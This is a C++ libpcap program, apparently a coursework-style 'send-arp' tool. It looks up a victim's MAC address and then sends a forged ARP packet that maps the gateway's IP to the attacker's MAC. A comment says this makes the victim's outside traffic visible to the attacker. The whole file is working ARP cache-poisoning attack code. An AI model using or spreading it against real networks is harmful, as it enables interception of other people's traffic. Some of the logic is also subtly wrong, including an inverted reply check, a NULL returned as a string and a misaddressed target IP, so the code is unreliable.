#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <cstring>

#include "ethhdr.h"
#include "arphdr.h"
#include "get_mac.h"
#include "get_ip.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

string myIp;
string myMac; //my(Attacker Mac)

pcap_t* handle;

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

string send_arp(string vicIp){
	printf("sent arp request\n");
	EthArpPacket packet; //arp request packet

	//sender = ma, target = victim
	packet.eth_.smac_ = Mac(myMac);
	packet.eth_.dmac_ = Mac::broadcastMac(); //broadcast mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	
	//My info
	packet.arp_.smac_ = Mac(myMac);
	packet.arp_.sip_ = htonl(Ip(myIp));

	//Victim
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //anyting
	packet.arp_.tip_ = htonl(Ip(vicIp));
	
	while (true){
   		int sent = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));                                               

		const u_char* cap_packet;
		struct pcap_pkthdr* header;
		
		int res = pcap_next_ex(handle, &header, &cap_packet);
		

		if (res == 0) continue;

		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

        const EthArpPacket* eth_arp_pkt = reinterpret_cast<const EthArpPacket*>(cap_packet);

		//check ARP Packet
        if (ntohs(eth_arp_pkt->eth_.type_) != EthHdr::Arp) continue;
	    const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);

		//Check reply packet
		if(arp_hdr->op()!=ArpHdr::Reply) continue;

		//Check correct sender
		if(arp_hdr->sip()==Ip(vicIp)) continue;
		
		return static_cast<string>(arp_hdr->smac());	
	}
	return NULL;
}

int main(int argc,	char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* interf = argv[1]; //interface
	string vicIp = argv[2]; //sender ip
	string gateIp = argv[3]; //target ip

	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(interf, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interf, errbuf);
		return -1;
	}

	EthArpPacket packet;
	string interface = interf;

	//get my(attacker)'s address
	myIp = get_ip(interface);
	myMac = get_mac(interface); 

	string vicMac = send_arp(vicIp);

	packet.eth_.smac_ = Mac(myMac);
	packet.eth_.dmac_ = Mac(vicMac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.op_ = htons(ArpHdr::Request);
	//My mac
	packet.arp_.smac_ = Mac(myMac);
	//target ip(gateway)
	packet.arp_.sip_ = htonl(Ip(gateIp));
	
	//Victim
	packet.arp_.tmac_ = Mac(vicMac);
	packet.arp_.tip_ = htonl(Ip(gateIp)); 

	/*
	result

	victim's arp table
	myMac:targetIP

	if victim connet to externel, that packet is visible to me
	*/

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	printf("sent arp spoofing\n");
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
